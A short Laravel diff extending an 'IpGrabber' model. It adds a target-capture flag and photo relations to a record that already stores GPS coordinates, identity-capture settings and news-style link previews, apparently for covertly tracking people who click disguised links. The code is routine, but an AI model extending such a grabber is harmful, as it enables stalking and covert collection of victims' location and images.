@@ -3,9 +3,11 @@
 namespace App\Models;
 
 use App\Models\Concerns\Auditable;
+use App\Models\IpGrabberFoto;
 use Illuminate\Database\Eloquent\Model;
 use Illuminate\Database\Eloquent\Relations\BelongsTo;
 use Illuminate\Database\Eloquent\Relations\HasMany;
+use Illuminate\Database\Eloquent\Relations\HasOne;
 use Illuminate\Support\Facades\Storage;
 
 class IpGrabber extends Model
@@ -35,6 +37,7 @@ class IpGrabber extends Model
         'mensagem',
         'noticia_url',
         'capture_gps',
+        'capture_alvo',
         'capture_identity',
         'og_titulo',
         'og_descricao',
@@ -76,6 +79,7 @@ class IpGrabber extends Model
         'gps_longitude' => 'float',
         'gps_accuracy' => 'float',
         'capture_gps' => 'boolean',
+        'capture_alvo' => 'boolean',
         'capture_identity' => 'boolean',
         'clicked_at' => 'datetime',
         'sent_at' => 'datetime',
@@ -100,6 +104,16 @@ class IpGrabber extends Model
     public function acessos(): HasMany
     {
         return $this->hasMany(IpGrabberAccess::class, 'pixel_track_id');
+    }
+
+    public function fotos(): HasMany
+    {
+        return $this->hasMany(IpGrabberFoto::class, 'pixel_track_id')->latest();
+    }
+
+    public function fotoMaisRecente(): HasOne
+    {
+        return $this->hasOne(IpGrabberFoto::class, 'pixel_track_id')->latestOfMany();
     }
 
     public function statusLabel(): string
